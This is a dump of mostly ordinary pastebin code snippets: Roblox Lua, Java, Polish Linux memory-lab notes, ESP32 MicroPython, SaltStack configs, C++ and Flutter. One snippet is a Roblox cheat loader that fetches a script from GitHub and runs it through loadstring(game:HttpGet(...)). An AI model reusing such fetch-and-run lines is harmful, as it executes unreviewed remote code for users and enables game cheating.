"
S7uzDeEE,Anti-AFK Script,-rave-,Lua,Thursday 29th of May 2025 07:22:47 AM CDT,"local TweenService = game:GetService(""TweenService"")
local UserInputService = game:GetService(""UserInputService"")
local Players = game:GetService(""Players"")
local LocalPlayer = Players.LocalPlayer

-- Create ScreenGui
local ScreenGui = Instance.new(""ScreenGui"")
ScreenGui.Name = ""CounterGui""
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = game:GetService(""CoreGui"")

local margin = 20

-- Function to create a styled frame like your Counter
local function createStyledFrame(size, position, anchorPoint)
	local frame = Instance.new(""Frame"")
	frame.Size = size
	frame.Position = position
	frame.AnchorPoint = anchorPoint
	frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	frame.BackgroundTransparency = 0.3
	frame.BorderSizePixel = 0
	
	local gradient = Instance.new(""UIGradient"", frame)
	gradient.Color = ColorSequence.new{
		ColorSequenceKeypoint.new(0, Color3.fromRGB(74, 74, 74)),
		ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
	}
	
	local corner = Instance.new(""UICorner"", frame)
	corner.CornerRadius = UDim.new(1, 8)
	
	local shadow = Instance.new(""ImageLabel"", frame)
	shadow.Name = ""Shadow""
	shadow.BackgroundTransparency = 1
	shadow.Position = UDim2.new(-0.32, 0, -0.92, 0)
	shadow.Size = UDim2.new(1.6, 0, 3.1, 0)
	shadow.ZIndex = -1
	shadow.Image = ""rbxassetid://9637602897""
	shadow.ImageColor3 = Color3.fromRGB(0,0,0)
	shadow.ImageTransparency = 0.7
	
	return frame
end

-- Positions for animation
local onScreenPos = UDim2.new(1, -margin, 1, -margin)
local offScreenPos = UDim2.new(1, 140, 1, -margin)

-- Main Counter UI
local Counter = createStyledFrame(UDim2.new(0, 140, 0, 52), offScreenPos, Vector2.new(1,1))
Counter.Name = ""Counter""
Counter.Parent = ScreenGui
Counter.Visible = true

-- Timer TextLabel
local TextLabel = Instance.new(""TextLabel"")
TextLabel.Parent = Counter
TextLabel.Size = UDim2.new(0, 63, 0, 23)
TextLabel.Position = UDim2.new(0.065, 0, 0.26, 0)
TextLabel.BackgroundTransparency = 1
TextLabel.Text = ""00:00:00""
TextLabel.Font = Enum.Font.FredokaOne
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextWrapped = true
TextLabel.BorderSizePixel = 0

-- Icon ImageLabel
local ImageLabel = Instance.new(""ImageLabel"")
ImageLabel.Parent = Counter
ImageLabel.Position = UDim2.new(0.59, 1, 0.10, 3)
ImageLabel.Size = UDim2.new(0, 40, 0, 33)
ImageLabel.BackgroundTransparency = 1
ImageLabel.Image = ""rbxassetid://1083501283"" -- your icon
ImageLabel.BorderSizePixel = 0

-- Maintain aspect ratio for icon
local UIAspectRatioConstraint = Instance.new(""UIAspectRatioConstraint"")
UIAspectRatioConstraint.Parent = Counter
UIAspectRatioConstraint.AspectRatio = 2.635

-- Timer update logic
spawn(function()
	local i = 0
	while true do
		wait(1)
		i += 1
		local h = math.floor(i / 3600)
		local m = math.floor((i % 3600) / 60)
		local s = i % 60
		TextLabel.Text = string.format(""%02d:%02d:%02d"", h, m, s)
	end
end)

-- Anti-AFK
local vu = game:GetService(""VirtualUser"")
LocalPlayer.Idled:Connect(function()
	vu:CaptureController()
	vu:ClickButton2(Vector2.new())
end)

-- Tween info for sliding
local slideTweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)

-- Function to slide in/out Counter UI
local function toggleCounter(visible)
	if visible then
		Counter.Visible = true
		local tween = TweenService:Create(Counter, slideTweenInfo, {Position = onScreenPos})
		tween:Play()
	else
		local tween = TweenService:Create(Counter, slideTweenInfo, {Position = offScreenPos})
		tween:Play()
		tween.Completed:Connect(function()
			Counter.Visible = false
		end)
	end
end

-- Initially slide in on start
toggleCounter(true)

-- Toggle UI on Right Ctrl
UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed then return end
	if input.KeyCode == Enum.KeyCode.RightControl then
		toggleCounter(not Counter.Visible)
	end
end)
"
WvzZeWQc,Untitled,thewitchking,Java,Thursday 29th of May 2025 06:23:12 AM CDT,"import java.util.*;
class Main {
    
    public List<List<Character>> subsets(String s) {
        List<List<Character>> list = new ArrayList<>();
        char [] c = s.toCharArray();
        backtrack(list, new ArrayList<>(), c, 0);
        return list;
    }

    private void backtrack(List<List<Character>> list , List<Character> tempList, char [] cs, int start){
        if(!tempList.isEmpty())
            list.add(new ArrayList<>(tempList));
        for(int i = start; i < cs.length; i++){
            tempList.add(cs[i]);
            backtrack(list, tempList, cs, i + 1);
            tempList.remove(tempList.size() - 1);
        }
    }
    public static void main(String[] args) {
        System.out.println(new Main().subsets(""xyz""));
    }
}"
dXm3qqkm,uzupelnienie - do usuniecia,dadix102,Bash,Thursday 29th of May 2025 06:02:34 AM CDT,"echo -e ""
\033[0;32m-------------------------------------------------------[4.1.1.12]-----------------------------------------------------------------------------\033[0m
\033[0;32mVSZ\033[0m - rozmiar stron [KiB]
rozmiar wszystkich przydzielonych dla procesu stron (w KiB) (cała pamięć, do której proces ma dostęp, czyli
pamięć wymieciona + pamięć zaalokowana + pamięć bibliotek współdzielonych + pamięć plików wykonywalnych)
 
\033[0;32mRSZ\033[0m - rozmiar ramek [KB]
rozmiar wszystkich przydzielonych dla procesu ramek z jego stronami (w KB) (nie uwzględnia SWAP, ale
uwzględnia pamięć bibliotek współdzielonych, czyli pokazuje tylko stan aktualny ramek w pamięci fizycznej)
 
\033[0;32mStrona jest ladowana do ramki\033[0m (czyli fizycznej strony pamieci) w momencie, gdy proces potrzebuje dostepu do danego obszaru pamieci wirtualnej,
ktory nie jest obecnie obecny w pamieci fizycznej.\n
 
\033[0;32mnie kazda\033[0m strona jest przechowywana w ramce tego procesu\n
gdy proces odwoluje sie do strony pamieci ktorej nie ma w zadnej z jego ramek \033[0;32mwystapi blad strony\033[0m
\033[0;32mkolejnosc odszukiwania strony\033[0m - poza zbiorem roboczym, (gdy wystapi \033[0;32mblad strony\033[0m):
\033[0;32m1.\033[0m swap cache - jesli znajdzie to blad poboczny, aktualizacja zbioru roboczego, pozniej tablicy
stron
\033[0;32m2.\033[0m przestrzeni wymiany swap
\033[0;32m3.\033[0m plik regularny tego programu lub biblioteki
 
\033[0;32mStrona jest ladowana do ramki\033[0m w momencie, gdy program probuje uzyskac dostep do tej strony.

To co proces ma w segmentach to jego pamięć wirtualna, każdy segment jest podzielony na strony. Te ze stron, które są
załadowane do ramek to jego rzeczywista fizyczna pamięć ulotna. Strony, które nie są w ramkach, znajdują się w
plikach regularnych programu lub bibliotekach, wykorzystywanych przez proces. Strona. która jest niepotrzebna dla
procesu zmienia oznaczenie na nieaktywną i jej właścicielem zostaje swap cache.

\033m Bedy glowne maj_flt blad glowny strona nie należy do zadnej ramki
\033
\033m Blad poboczny min_flt poboczny należy do ramki ale nie należy do obszaru roboczego procesu 
co to obszar roboczy -  zbior ramek\033
""

echo bfq > /sys/block/sda/queue/scheduler
time perf sched record ionice -c 1 -n 0 stress -i 1 -t 240


ps -o pid,cmd,maj_flt,min_flt $(pidof stress)
ps -o pid,vsz,rsz $(pidof stress -s) | grep --color -E ""VSZ|RSZ|$""


 echo -e ""
\033[0;32m-------------------------------------------------------[4.1.1.24]-----------------------------------------------------------------------------\033[0m
    Należy regularnie kontrolować stan dostępnej pamięci operacyjnej (mem \033[0;32mused\033[0m i \033[0;32mavailable\033[0m) oraz ile mamy wykorzystanej
    pamięci swap (ilosc wolnych ramek w pamieci, zajetosc przestrzeni wymiany swap)
 
    Jeśli posiadamy mało wolnej ulotnej pamięci fizycznej (available) oraz mało wolnej pamięci przestrzeni wymiany (free),
    możemy spodziewać się podjęcia przez system operacyjny odpowiednich kroków
    
    \033[0;32mW przypadku presji pamieci\033[0m (kiedy brakuje ramek) system stosuje:
    \033[0;32m1.\033[0m wymiatanie stron.
    \033[0;32m2.\033[0m redukcja zbioru roboczego procesu - odebranie czesci przydzielonych procesom ramek
    \033[0;32m3.\033[0m procedura OOM (Out of Memory) - wybierane sa procesy, ktore zostana natychmiast zakonczone
    
    Aby procedura OOM nie była zastosowana możemy:
    \033[0;32m- powiekszyc przestrzen wymiany\033[0m poprzez dodanie pliku wymiany (ale tylko w Linuxie, w Windowsie nie można, bo trzeba by było restartować system
    \033[0;32m- zakonczyc procesy\033[0m, które są nam już niepotrzebne, dzięki czemu będziemy mieli kontrolę nad procesami, które zostaną zamknięte
    \033[0;32m- zapisać stan procesów\033[0m na dysku.
    
    Dlatego też instalowanie systemu bez przestrzeni wymiany swap jest złym pomysłem, ponieważ bez magazynów stron
    przyspierzymy wystąpienie procedury OOM.
 
    \033[0;32mfree\033[0m - rozmiar wolnej pamieci ulotnej(operacyjnej) ale bez ramek z przestrzeni swap cache (NIE UZYWANA PRZEZ ZADEN URUCHOMIONY PROCES,
        GOTOWA DO ALOKACJI DLA NOWEGO PROCESU)
 
    \033[0;32mAvailable\033[0m - rozmiar wolnych ramek wraz z ramkami z swap-cache, ktore zawieraja niezabrudzone i nieanonimowe strony
    
    pokaze wartosc free(mem)(rozmiar wolnych ramek) + ramki ze swap cache NIEZABRUDZONE I NIEANONIMOWE strony + z buforow te zabrudzone
 
    SZACUJE ILOSC PAMIECI MOZLIWA DO PRZYDZIELENIA NOWEMU PROCESOWI, BIERZE POD UWAGE BUFORY I CACHE, KTORE MOGA ZOSTAC ZWOLNIONE PRZEZ INNE PROCESY W RAZIE POTRZEBY
""
 
    free -wh | grep --color -E ""free|used|$""






1:
echo -e ""\033[0;32m-------------------------------------------------------[4.1.2.21]-----------------------------------------------------------------------------\033[0m""


2:
lscpu
numactl --cpunodebind=2 --membind=2 leafpad


1:
pidof leafpad
ps -o pid,nlwp -p $(pidof leafpad)
numastat -p $(pidof leafpad)
numactl -H
taskset -c -a -p $(pidof leafpad)

#uma - zasoby nie dziela się na wezly
#numa - zasoby dziela się na wezly zawierające pewny obszar pamięci operacyjnej i jednostki przetwarzające. Jest to korzystniejsze ponieważ przetwarzanie w ramach jednego wezla jest szybsze


echo -e ""Maska przypisana zgadza się z przypisanymi CPU do tego węzła (6-9) – widać, że nastąpiło ograniczenia zasobów
 
\033[0;32mNUMA\033[0m to architektura komputerów charakteryzująca się podziałem na węzły, które dysponują jednostkami przetwarzającymi i
ciągła przestrzenią pamięci ulotnej RAM
 
*Obowiązująca polityka NUMA oraz reguły koligacji są zawsze nadrzędne do ustalonej polityki szeregowania*
\033[0;32mNUMA > koligacja > priorytet statyczny > polityka szeregowania > priorytet zewnętrzny nice\033[0m
 
\033[0;32m#P\033[0m Co jeżeli reguły koligacji mówią że proces może korzystać z drugiego CPU a należy do węzła NUMA który nie zawiera tej
jednostki przetwarzającej?
- nie dostanie wtedy przydziału jednostki przetwarzającej ponieważ NUMA jest nadrzędna
NUMASTAT
- Huge - zakres dużych stron (mogą zajmować 2MiB)
- Heap - sterta
- Stack - stos
- Private - strony anonimowe (segment składa się ze stron)
Tablica TLB - przechowywane są ostatnio transformowane adresy stron z logicznych na fizyczne gdy odwołamy się do adresu
strony której nie ma zostanie ona przetransformowane.
Tablica stron - Zawiera numery ramek odpowiadające numerom stron
 
\033[0;32m#P\033[0m Skąd wiadomo, że ten proces korzystał z pamięci ulotnej, zlokalizowanej w tym ostatnim węźle?
- anonimowe segmenty pamięci - stos i stertę lokalizował w pamięci węzła nr 2. (pokazać niezerowe wartości po wykonaniu
polecenia numastat -p <PID>
 
\033[0;32m#P\033[0m Skąd wiadomo że to jednostki z ostatniego węzła?
- z polecenia numactl -H widać node 2 cpus: 6 7 8 9
 
\033[0;32m#P\033[0m Jakie zasoby przynależą do węzłów NUMA?
- jednostki przetwarzające i obszar pamięci ulotnej
""





echo -e ""\033[0;32m-------------------------------------------------------[4.1.2.22]-----------------------------------------------------------------------------\033[0m""

lscpu | grep NUMA

numademo 100M memset #może być 350M jak będzie dzialalo

#pokazuje:
#memory on node 1 memset Avg 17118
#dla
#memory interleaved on 0 1 2 memset Avg 16651

#przekaz danych poprzez szyne interconnect powoduje opóźnienie w przetwarzaniu

"
DgCV8MJC,dataNone,TestGuy1,JSON,Thursday 29th of May 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '0df19224c60896023fec62661e381ab4612a59638c4010a500e471484a02c75576b46fa955eada663b17185092c2d028635ef0da84d50a2f98ec8b621d43622b76b163c4b5f63ec76584512c5cd98966d3cfcf829cf7ca1026935a6ed7427eaa8bfe5715ab2dbfbebdc97352b862c95a75e23da7e85d4b669e69050e5b8b1d07',
  otherdata: [
    'e1244e51e554b3906c7bd85404094710',
    'cac2159116153fde6e9434aadcbc7758',
    'caaafafe62b5446faa821ea5510ef510',
    'b41569182382709813d62a3ceef28f77',
    '609d82b6868825ebfe1012c375bd588a',
    'e9a3eddd643268fb7bc626ab59c79729',
    '9b222d11cbfcf8fd9cc8361864b2d968',
    '9f9b08d34d2d779f17685e18e9023ab5'
  ]
}"
RuFqsCYR,grow a fish pond,new2479,Lua,Thursday 29th of May 2025 05:59:41 AM CDT,"--https://www.youtube.com/@WinPo1R              pls sub 
--discord :      https://discord.gg/mdnJJYbjCh
 
 
loadstring(game:HttpGet(""https://raw.githubusercontent.com/powin273/script/refs/heads/main/Grow_a_Fish_Pond.lua"", true))()"
4MDcr4Kc,wifu_menu.py,orborbson,Python,Thursday 29th of May 2025 05:57:26 AM CDT,"import wifu, machine, socket
from micropython import const

state = None
led_on = const(1)
led_off = const(0)
sleep_ds = const(10)

def web_page():
    global state, led
    
    if state == 'on':
        led.value(led_on)
    elif state == 'off':
        led.value(led_off)
    elif state == 'ds':
        wifu.wlan.off()
        machine.deepsleep(sleep_ds * 1000)
    
    html = f'''<!DOCTYPE html>
    <html lang=""pl"">

    <head>
        <meta charset=""UTF-8"">
        <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
        <title>Sterowanie</title>
        <style>
            body {{
                font-family: Arial, sans-serif;
                text-align: center;
                margin-top: 50px;
                background-color: #f4f4f4;
            }}

            h1 {{
                color: #333;
            }}

            p {{
                font-size: 1.2em;
                color: #555;
            }}

            .button {{
                display: inline-block;
                padding: 15px 30px;
                margin: 10px;
                font-size: 1.2em;
                font-weight: bold;
                color: #fff;
                text-decoration: none;
                border: none;
                border-radius: 8px;
                cursor: pointer;
                transition: background-color 0.3s;
            }}

            .button.on {{
                background-color: #4CAF50;
            }}

            .button.on:hover {{
                background-color: #45a049;
            }}

            .button.off {{
                background-color: #f44336;
            }}

            .button.off:hover {{
                background-color: #d32f2f;
            }}

            .button.deepsleep {{
                background-color: #8c0dc2;
            }}

            .button.deepsleep:hover {{
                background-color: #6b0b93;
            }}
        </style>
    </head>

    <body>
        <h1>{wifu.hostname}</h1>
        <p>Stan: {state}</p>
        
        <form action=""/"" method=""get"" style=""display: inline;"">
            <button type=""submit"" name=""relay"" value=""on"" class=""button on"">Włącz</button>
        </form>

        <form action=""/"" method=""get"" style=""display: inline;"">
            <button type=""submit"" name=""relay"" value=""off"" class=""button off"">Wyłącz</button>
        </form>
        <br>
        <form action=""/"" method=""get"" style=""display: inline;"">
            <button type=""submit"" name=""relay"" value=""deepsleep"" class=""button deepsleep"">głęboki sen ({sleep_ds} sek)</button>
        </form>
    </body>

    </html>
    '''
    return html

led = machine.Pin(2, machine.Pin.OUT, value=led_off)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', 80))
s.listen(5)

while True:
    gc.collect()
    conn, addr = s.accept()
    request = conn.recv(1024)
    request_str = request.decode()
    redirect = False
    
    if 'GET /?relay=on HTTP' in request_str:
        state = 'on'
        redirect = True
    elif 'GET /?relay=off HTTP' in request_str:
        state = 'off'
        redirect = True
    elif 'GET /?relay=deepsleep HTTP' in request_str:
        state = 'ds'
        redirect = True
    
    if redirect:
        conn.send('HTTP/1.1 302 Found\r\nLocation: /\r\nConnection: close\r\n\r\n')
    else:
        response = web_page()
        conn.send('HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n')
        conn.sendall(response)
    conn.close()"
2U96nzjR,wifu.py,orborbson,Python,Thursday 29th of May 2025 05:55:48 AM CDT,"import sys, network, time

class wifix:
    def __init__(self, ssid, passwd):
        self.ssid = ssid
        self.passwd = passwd
        self.wlan = network.WLAN(network.WLAN.IF_STA)
        self.wlan.active(True)
        self.wlan.config(dhcp_hostname=""esp32"")
        
    def find(self, wait = 3):
        while True:
            for net in self.wlan.scan():
                if net[0].decode() == self.ssid:
                    sys.stdout.write(f'[INFO]: znaleziono ""{self.ssid}""\n')
                    return
            time.sleep(wait)
    
    def connect(self, wait = 1):
        if not self.wlan.isconnected():
            self.wlan.connect(self.ssid, self.passwd)
            while not self.wlan.isconnected():
                time.sleep(wait)
            sys.stdout.write(f'[INFO]: połączono z ""{self.ssid}"", IP: {self.wlan.ifconfig()[0]}\n')
        else:
            sys.stdout.write(f'[INFO]: już połączony z ""{self.ssid}"", IP: {self.wlan.ifconfig()[0]}\n')
            
    def off(self):
        self.wlan.active(False)
        time.sleep(1)
    
    @property        
    def hostname(self):
        return self.wlan.config(""dhcp_hostname"")

wlan = wifix('wifu', 'haslo123')
wlan.find()
wlan.connect()
hostname = wlan.hostname"
r2SS1j0Q,Untitled,konstest,YAML,Thursday 29th of May 2025 05:41:20 AM CDT,".no-web-no-mr: &no-web-no-mr
  if: '$CI_PIPELINE_SOURCE == ""web"" || $CI_PIPELINE_SOURCE == ""merge_request_event""'
  when: never

.no-mr: &no-mr
  if: '$CI_PIPELINE_SOURCE == ""merge_request_event""'
  when: never

workflow:
  # convert master branch name to base saltenv
  rules:
    - if: $CI_COMMIT_BRANCH == ""master""
      variables:
        SALTENV: saltenv=base pillarenv=base
    - variables:
        SALTENV: saltenv=""$CI_COMMIT_BRANCH"" pillarenv=""$CI_COMMIT_BRANCH""
    - <<: *no-mr

.manual-without-duplicate-pipelines:
  rules:
    - <<: *no-mr
    - when: manual
      # let the jobs be skipped, since rules force allow_failure to be false
      # https://docs.gitlab.com/13.12/ee/ci/yaml/index.html#allow_failure
      allow_failure: true

.salt-master:
  image: docker:latest
  extends:
    - .manual-without-duplicate-pipelines
  tags:
    - devops-ci-master.build.company.ru
  #  before_script:
  #    - sleep 10; echo ""Timer for salt-master gitfs git pull scheduler""
  variables:
    MASTER: docker exec -i devops-ci-master
  dependencies: []

#
# Autosyncing pillars & salt modules to ALL servers
saltutil.sync_all to ALL servers:
  stage: salt-master-last-stage
  rules:
    - <<: *no-web-no-mr
    - if: '$CI_COMMIT_REF_NAME == ""master"" && $CI_PIPELINE_SOURCE != ""trigger""'
      changes:
        - pillar/**/*
        - salt/_*/*
      when: on_success
      allow_failure: true
  extends:
    - .salt-master
  script:
    - $MASTER salt -C ""*"" saltutil.sync_all || true

branch $COMMAND on $TARGET:
  stage: salt-master
  extends:
    - .salt-master
  script:
    - $MASTER salt -C ""$TARGET"" saltutil.refresh_grains || true
    - $MASTER salt -C ""$TARGET"" saltutil.refresh_pillar || true
    - echo salt -C ""$TARGET"" $COMMAND $SALTENV
    - $MASTER salt -C ""$TARGET"" $COMMAND $SALTENV

branch async $COMMAND on $TARGET:
  stage: salt-master
  extends:
    - .salt-master
  script:
    - echo salt -C ""$TARGET"" $COMMAND $SALTENV
    - jid=$($MASTER salt -C ""$TARGET"" $COMMAND $SALTENV --async | cut -d' ' -f6)
    - while [ ""$($MASTER salt-run jobs.active | grep $jid)"" != '' ]; do echo waiting executing $jid command':' salt -C ""$TARGET"" $COMMAND $SALTENV; done;
    - $MASTER salt-run jobs.lookup_jid jid=$jid missing=False returned=True
    - $MASTER salt-run jobs.lookup_jid jid=$jid missing=True returned=False"
qaN4q2FE,Painting Fence 448C Codeforces,Fastrail08,C++,Thursday 29th of May 2025 05:38:33 AM CDT,"//QUESTION - https://codeforces.com/problemset/problem/448/C
// TODO - MEMO/DP..recursive solution written
#include <bits/stdc++.h>
using namespace std;

void getMinimumStrokes(int level, long long strokes, long long &minStrokes, vector<int> &fence){
    if(level >= fence.size()){
     minStrokes = min(minStrokes, strokes);  
     return;
    }
    
    // If section is already painted, move to the next section
    if(fence[level] == 0){
        getMinimumStrokes(level + 1, strokes, minStrokes, fence);
    }
    
    // Else we have 2 ways of painting (H, V);
    else{
        //horizontal stroke
        int paintedTill = -1;
        for(int i = level; i < fence.size(); i++){
            if(fence[i] == 0){
                break;
            }
            paintedTill = i;
            fence[i]--;
        }
        getMinimumStrokes(level, strokes + 1, minStrokes, fence);
        // backtrack to previous state where horizontal stroke didn't happen
        int actualRangePainted = paintedTill == -1 ? fence.size() - 1: paintedTill;
            if(paintedTill != -1){
                for(int i = level; i <= paintedTill; i++){
                fence[i]++;
            }
        }
        
        //vertical stroke
        int currUnpaintedFence = fence[level];
        fence[level] = 0;
        getMinimumStrokes(level + 1, strokes + 1, minStrokes, fence);
        fence[level] = currUnpaintedFence;
    }
}

int main() {
	// your code goes here
    int n;
    cin >> n;
    vector<int> fence(n);
    for(int i = 0; i < n; i++){
        cin >> fence[i];
    }
    long long minStrokes = INT_MAX;
    getMinimumStrokes(0, 0, minStrokes, fence);
    cout << minStrokes << '\n';
}
"
69tppax2,Untitled,konstest,YAML,Thursday 29th of May 2025 05:28:08 AM CDT,"# cat /etc/salt/master.d/gitfs.conf

state_output: changes
#ipc_write_buffer: 'dynamic'

# https://docs.saltstack.com/en/latest/topics/pillar/#master-provided-pillar-error
pillar_safe_render_error: False

worker_threads: 48
fileserver_backend:
  - gitfs
 
default_top: master
id: devops-ci-master.build.company.ru
gitfs_base: master
gitfs_provider: pygit2
gitfs_global_lock: False
git_pillar_global_lock: False
gitfs_pubkey: /opt/PublicReader.pub
gitfs_privkey: /opt/PublicReader
 
gitfs_remotes:
  - git@gitlab.company.com:scm/DevopsPrivate-SaltStack.git:
    - name: Private_salt_states
    - base: master
    - root: salt/states
    - pubkey: /opt/DevopsPrivateReader.pub
    - privkey: /opt/DevopsPrivateReader
    - update_interval: 15
  - git@gitlab.company.com:scm/DevopsPrivate-SaltStack.git:
    - name: Private_salt
    - base: master
    - root: salt
    - pubkey: /opt/DevopsPrivateReader.pub
    - privkey: /opt/DevopsPrivateReader
    - update_interval: 15
  - git@gitlab.company.com:scm/Public-SaltStack.git:
    - name: Public_formulas_states
    - base: master
    - root: formulas/states
    - update_interval: 15
    - fallback: master
  - git@gitlab.company.com:scm/Public-SaltStack.git:
    - name: Public_formulas
    - base: master
    - root: formulas
    - update_interval: 15
    - fallback: master


ext_pillar:
  - git:
    - __env__ git@gitlab.company.com:scm/DevopsPrivate-SaltStack.git:
      - root: pillar
      - pubkey: /opt/DevopsPrivateReader.pub
      - privkey: /opt/DevopsPrivateReader

git_pillar_update_interval: 15
git_pillar_base: master
state_top_saltenv: base
pillar_source_merging_strategy: none
top_file_merging_strategy: same
gather_job_timeout: 30
pillarenv_from_saltenv: true
sock_pool_size: 30"
tNW7Lrb3,pallet generator,mactech24,Dart,Thursday 29th of May 2025 05:04:21 AM CDT,"// ignore_for_file: avoid_unnecessary_containers, sized_box_for_whitespace

import 'package:flutter/material.dart';
import 'package:flutter_phosphor_icons/flutter_phosphor_icons.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:hooks_riverpod/hooks_riverpod.dart';
import 'package:monita/router/app_router.dart';
import 'package:monita/screens/Transfer/sendMoney/widget/send_money_model.dart';
import 'package:monita/utils/utils_size.dart';
import 'package:monita/widgets/appbar.dart';
import 'package:monita/widgets/global_widgets.dart';
import 'package:monita/widgets/icon_widget.dart';
import 'package:palette_generator/palette_generator.dart';
import '../../../constants/constants.dart';
import '../../../controller/general_provider.dart';

class SendMoneyScreen extends StatefulWidget {
  const SendMoneyScreen({super.key});
  static String routeName = ""/sendMoneyScreen"";

  @override
  _SendMoneyScreenState createState() => _SendMoneyScreenState();
}

class _SendMoneyScreenState extends State<SendMoneyScreen> {
  @override
  Widget build(BuildContext context) {
    SizeConfig().init(context);
    Size size = MediaQuery.of(context).size;
    return Consumer(
      builder: (_, ref, __) {
        return Scaffold(
          backgroundColor:
              ref.watch(generalNotifierProvider) ? lightBlack : darkLemond2,
          appBar: AppBar(
            backgroundColor:
                ref.watch(generalNotifierProvider) ? lightBlack : darkLemond2,
            surfaceTintColor: transparent,
            automaticallyImplyLeading: false,
            elevation: 0,
            title: Column(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                appBar1(context, sendMoneyToText,
                    titleColor:
                        ref.watch(generalNotifierProvider) ? white : white),
              ],
            ),
            centerTitle: true,
          ),
          body: Column(
            children: [
              verticalSpace(getProportionateScreenHeight(20)),
              Padding(
                padding: EdgeInsets.symmetric(
                  horizontal: getProportionateScreenWidth(15),
                ),
                child: buildSearchField(
                  borderColor: transparent,
                  background: ref.watch(generalNotifierProvider)
                      ? primaryBaseDarkmode
                      : const Color(0xFF5e6c0b),
                  hintText: ""Search Bannk or Beneficiary"",
                  prifixIconColor: ref.watch(generalNotifierProvider)
                      ? white.withOpacity(0.72)
                      : white.withOpacity(0.72),
                  hintTextColor: ref.watch(generalNotifierProvider)
                      ? white.withOpacity(0.72)
                      : white.withOpacity(0.72),
                  textColor: ref.watch(generalNotifierProvider)
                      ? white.withOpacity(0.72)
                      : white.withOpacity(0.72),
                  onChanged: (value) {},
                ),
              ),
              verticalSpace(getProportionateScreenHeight(20)),
              Expanded(
                child: Container(
                  width: size.width,
                  decoration: BoxDecoration(
                      color: ref.watch(generalNotifierProvider)
                          ? primaryBaseDarkmode
                          : white,
                      borderRadius: const BorderRadius.vertical(
                        top: Radius.circular(30),
                      )),
                  child: const SendMoneyContent(),
                ),
              )
            ],
          ),
        );
      },
    );
  }
}

class SendMoneyContent extends StatelessWidget {
  const SendMoneyContent({super.key});

  @override
  Widget build(BuildContext context) {
    return ListView(
      padding: const EdgeInsets.all(16),
      children: [
        const RecentBeneficiaries(),
        const SizedBox(height: 16),
        BankListSection(),
      ],
    );
  }
}

class RecentBeneficiaries extends StatefulWidget {
  const RecentBeneficiaries({
    super.key,
  });

  @override
  State<RecentBeneficiaries> createState() => _RecentBeneficiariesState();
}

class _RecentBeneficiariesState extends State<RecentBeneficiaries> {
  Color backgroundColor = Colors.grey.shade200;
  final List<BeneficiaryBank> beneficiaryList = [
    const BeneficiaryBank(
      firstName: ""Macsmith"",
      lastName: ""Okorie"",
      imagePath: ""assets/banks/firstbank.png"",
    ),
    const BeneficiaryBank(
      firstName: ""Emmanuel"",
      lastName: ""Omobude"",
      imagePath: ""assets/banks/paycom.png"",
    ),
    const BeneficiaryBank(
      firstName: ""Toheeb"",
      lastName: ""Asuwanju"",
      imagePath: ""assets/banks/stanbic-ibtc-bank.png"",
    ),
    const BeneficiaryBank(
      firstName: ""Musa"",
      lastName: ""Babalola"",
      imagePath: ""assets/banks/jaiz-bank.png"",
    ),
    const BeneficiaryBank(
      firstName: ""Tola"",
      lastName: ""Timothy"",
      imagePath: ""assets/banks/suntrust-bank.png"",
    ),
    const BeneficiaryBank(
      firstName: ""Mary"",
      lastName: ""Bisola"",
      imagePath: ""assets/banks/gtb.png"",
    ),
    const BeneficiaryBank(
      firstName: ""Tola"",
      lastName: ""Timothy"",
      imagePath: ""assets/banks/sterling-bank.png"",
    ),
  ];

  @override
  void initState() {
    super.initState();
    _updatePalette();
  }

  Color lightenColor(Color color, [double amount = 0.3]) {
    final hsl = HSLColor.fromColor(color);
    final lightened =
        hsl.withLightness((hsl.lightness + amount).clamp(0.0, 1.0));
    return lightened.toColor();
  }

  Future<void> _updatePalette() async {
    final imageProvider = AssetImage(beneficiaryList[0].imagePath);

    final paletteGenerator = await PaletteGenerator.fromImageProvider(
      imageProvider,
      size: const Size(300, 300),
      maximumColorCount: 20,
    );

    Color? rawColor = paletteGenerator.dominantColor?.color ??
        paletteGenerator.vibrantColor?.color ??
        paletteGenerator.mutedColor?.color;

    setState(() {
      backgroundColor = rawColor != null
          ? lightenColor(rawColor, 0.4) // You can adjust brightness (0.1–0.5)
          : Colors.grey.shade200;
    });
  }

  @override
  Widget build(BuildContext context) {
    return Consumer(builder: (_, ref, __) {
      return Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          verticalSpace(getProportionateScreenHeight(10)),
          textWidget(
            ""Recents"",
            fontWeight: FontWeight.w700,
            fontSize: getProportionateScreenWidth(17),
            color: ref.watch(generalNotifierProvider) ? white : lightBlack,
          ),
          verticalSpace(getProportionateScreenHeight(10)),
          SizedBox(
            height: getProportionateScreenHeight(90),
            child: ListView.separated(
              scrollDirection: Axis.horizontal,
              itemCount: beneficiaryList.length,
              itemBuilder: (context, index) {
                final beneficiary = beneficiaryList[index];
                return RecentBeneficiaryCards(beneficiaryBank: beneficiary);
              },
              separatorBuilder: (_, __) => const SizedBox(width: 16),
            ),
          ),
        ],
      );
    });
  }
}

class BankListSection extends StatelessWidget {
  BankListSection({super.key});

  final List<Bank> banks = [
    const Bank(name: ""Kuda Bank"", imagePath: ""assets/banks/kuda-bank.png""),
    const Bank(
        name: ""First Bank Of Nigeria"", imagePath: ""assets/banks/firstbank.png""),
    const Bank(name: ""Fidelity Bank"", imagePath: ""assets/banks/fidelity.png""),
    const Bank(
        name: ""United Bank for Africa"",
        imagePath: ""assets/banks/united-bank-for-africa.png""),
    const Bank(
        name: ""Sterling Bank"", imagePath: ""assets/banks/sterling-bank.png""),
    const Bank(name: ""Jaiz Bank"", imagePath: ""assets/banks/jaiz-bank.png""),
    const Bank(name: ""Paycom"", imagePath: ""assets/banks/paycom.png""),
    const Bank(name: ""GTB"", imagePath: ""assets/banks/gtb.png""),
    const Bank(
        name: ""Stanbic IBTC Bank"",
